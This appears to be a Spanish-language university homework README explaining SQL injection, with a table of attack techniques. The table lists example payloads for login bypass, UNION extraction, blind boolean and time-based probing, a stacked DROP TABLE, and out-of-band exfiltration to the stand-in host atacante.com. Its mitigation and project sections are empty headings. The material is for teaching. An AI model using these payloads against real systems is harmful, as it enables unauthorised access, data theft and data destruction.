<div align="center">
  <img src="https://images.seeklogo.com/logo-png/7/2/ipn-logo-png_seeklogo-73340.png" align="left" width="90" alt="Logo IPN" />
  <img src="https://www.escom.ipn.mx/x/ee2021/images/galeriaEE2021/escudo_ESCOM.png" align="right" width="120" alt="Logo ESCOM" />
  
  <h2>Instituto Politécnico Nacional</h2>
  <h2>Escuela Superior de Cómputo</h2>

  <br><br><br><br>

  <b>Tarea</b><br>
  <b>Seguridad y Vulnerabilidades en Bases de Datos: SQL Injection</b>

  <br><br><br>

  <b>Alumno:</b><br><br>
  Olate Tomás Kevin Saúl<br>
  Garcia Peñalva Saúl 
  

  <br><br>

  <b>Profesor:</b><br>
  Gabriel Hurtado Avilés

  <br><br>

  <b>Unidad de Aprendizaje:</b><br>
  Bases de Datos

  <br><br>

  <b>Grupo:</b><br>
  3BV1

  <br><br>
</div>

---

# Tarea de SQL Injection

La presente tarea tiene como objetivo explorar los conceptos fundamentales de la inyección SQL (SQL Injection) y analizar su implementación en el proyecto Scynara. Para ello, se proporciona el backend de la aplicación, configurado para su despliegue en contenedores Docker, y se documenta el procedimiento de ejecución y validación mediante el uso de herramientas de prueba de APIs, como Postman y Thunder Client.

## Introducción 
En los años 90, cuando las páginas web comenzaron a ser interactivas y a conectarse directamente con las bases de datos, surgieron nuevos riesgos de seguridad. En ese contexto apareció la Inyección SQL, registrada por primera vez en 1998.

A pesar de todo lo que ha avanzado la tecnología y la programación desde entonces, esta amenaza no ha desaparecido. Hoy en día, prevenirla sigue siendo un requisito obligatorio y fundamental al desarrollar cualquier sistema que maneje información.

## ¿Qué es SQL Injection?
La Inyección SQL es un ataque que consiste en insertar código SQL malicioso directamente en los campos de entrada de datos de una aplicación, tales como formularios de inicio de sesión, barras de búsqueda o parámetros de la URL.  
Esta vulnerabilidad ocurre principalmente cuando un sistema no filtra, sanitiza ni valida adecuadamente la información ingresada por el usuario. Como resultado, cuando la aplicación procesa esta entrada, el motor de la base de datos recibe el código manipulado y lo ejecuta bajo la premisa de que es una instrucción legítima del sistema.  
En la práctica, este ataque se aprovecha de la mala costumbre de concatenar texto directamente en las consultas del backend. Al explotar esta falla, un atacante puede alterar la lógica original de la base de datos para evadir autenticaciones, extraer información confidencial o ejecutar comandos destructivos.

## Elementos Fundamentales de la Inyección SQL
Para que un ataque de inyección SQL se materialice, el sistema debe presentar deficiencias específicas en el procesamiento de la información. 
El ataque inicia cuando un actor malicioso inserta código manipulado en los campos de entrada de la aplicación, como los formularios de inicio de sesión o los parámetros de búsqueda. La vulnerabilidad crítica ocurre cuando el backend carece de una separación estricta entre la estructura de la consulta y los datos del usuario, tomando esta entrada y concatenándola directamente como texto plano sin un filtrado previo. En consecuencia, el motor de la base de datos recibe la cadena completa y ejecuta el código malicioso bajo la falsa premisa de que es una instrucción legítima del sistema.

Para que este engaño funcione en motores relacionales, los atacantes inyectan caracteres de control y palabras clave (como comillas simples ', signos de igual =, o guiones de comentario -- en el caso de MySQL) para alterar la estructura de la consulta original. El ejemplo más didáctico es la evasión de un login. Si el sistema espera credenciales, un atacante puede ingresar un texto manipulado como admin' -- en el campo de usuario. La comilla simple (') le indica a la base de datos que el texto del nombre ha terminado prematuramente, mientras que los guiones (--) le ordenan interpretar el resto de la consulta como un comentario, eliminando por completo la validación de la contraseña. Otra técnica fundamental es ingresar 1' OR '1'='1, lo cual fuerza a que la condición matemática sea siempre verdadera, otorgando acceso inmediato.

Una vez que se rompe la barrera entre "datos" e "instrucciones", el ataque evoluciona en diferentes variantes dependiendo de cómo el sistema devuelva la información. A continuación, se clasifican las formas más comunes:

| Categoría Principal | Técnica Específica | Descripción del Mecanismo | Ejemplo de Payload | Escenario de Explotación en el Backend |
| --- | --- | --- | --- | --- |
| **In-Band (Misma Banda)** | **Basada en Errores (Error-Based)** | El atacante inyecta sintaxis malformada intencionalmente para forzar al motor de la base de datos a devolver un mensaje de error detallado. Estos errores revelan información sobre la estructura de las tablas, columnas o la versión del motor. | `' OR 1=CONVERT(int, (SELECT @@version)) --` | Al fallar la búsqueda en un CRUD de productos, el servidor devuelve un código HTTP 500 exponiendo el *stack trace* completo con el nombre de la base de datos de producción. |
| **In-Band (Misma Banda)** | **Basada en UNION (UNION-Based)** | Utiliza el operador `UNION SELECT` para anexar los resultados de una consulta maliciosa a los de una consulta legítima. Requiere que ambas consultas tengan el mismo número de columnas y tipos de datos compatibles.

 | <br>`' UNION SELECT 1, version(), current_database() --` 

 | En un ERP con arquitectura *multi-tenant*, un usuario con privilegios bajos intercepta la petición `GET /api/categorias?id=1` e inyecta un `UNION` para extraer los `tenant_id` y contraseñas de otros administradores. |
| **Inferencial (Ciega)** | **Basada en Booleanos (Boolean-Based)** | Ocurre cuando el backend no devuelve datos ni errores en la pantalla. El atacante inyecta condiciones lógicas (Verdadero/Falso) y observa si la respuesta HTTP o el comportamiento de la página cambian para inferir si la inyección fue exitosa.

 | `1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE id=1)='a' --` | Al inyectar la condición en un endpoint de inicio de sesión, si la respuesta es "Usuario no encontrado", la letra adivinada es incorrecta; si la respuesta cambia, la letra es correcta. |
| **Inferencial (Ciega)** | **Basada en Tiempo (Time-Based)** | Similar a la anterior, pero cuando el sistema ni siquiera cambia su respuesta ante condiciones verdaderas o falsas. El atacante fuerza a la base de datos a pausar su ejecución y mide el tiempo de respuesta del servidor.

 | MySQL: `' OR IF(1=1, SLEEP(5), 0) --` 

<br>

<br>

<br>PostgreSQL: `' OR (SELECT pg_sleep(5)) IS NOT NULL --` 

 | Se inyecta el payload en un script de normalización de datos. Si el servidor tarda exactamente 5 segundos adicionales en responder, el atacante confirma que el sistema es vulnerable y comienza a extraer datos letra por letra. |
| **Consultas Apiladas (Stacked Queries)** | **Ataques Destructivos / DDL** | Consiste en finalizar la consulta original con un punto y coma (`;`) y concatenar comandos DDL o DML (como `DROP`, `UPDATE` o `INSERT`). Su éxito depende netamente del *driver* de conexión del backend.

 | `1'); DROP TABLE categorias_crud; --` | Altamente crítico en PostgreSQL, donde muchos *drivers* (como `psycopg2` si se usan mal) permiten enviar múltiples instrucciones separadas por `;` en una sola llamada. En MySQL, librerías modernas como PDO o conectores en Python bloquean esto por defecto arrojando errores de sintaxis.

 |
| **Out-of-Band (OOB)** | **Exfiltración Externa** | Se utiliza cuando el atacante no puede extraer los datos mediante la misma conexión web ni inferirlos por tiempo. Fuerza al motor de base de datos a realizar una petición externa (como una consulta DNS o HTTP) hacia un servidor controlado por el atacante, enviando los datos robados en la petición. | `'; EXEC master..xp_dirtree '//atacante.com/datos' --` *(Específico de SQL Server)* | Un atacante inyecta el payload; el servidor de base de datos realiza una resolución DNS hacia `password_robada.atacante.com`. El atacante revisa los *logs* de su servidor DNS para capturar la información extraída. |

---

## Mejores Prácticas de Mitigación

## Prevención en Backends Modernos


# Análisis e Implementación en el Proyecto Scynara

## Arquitectura y Configuración del Entorno 

## Herramientas de Validación y Pruebas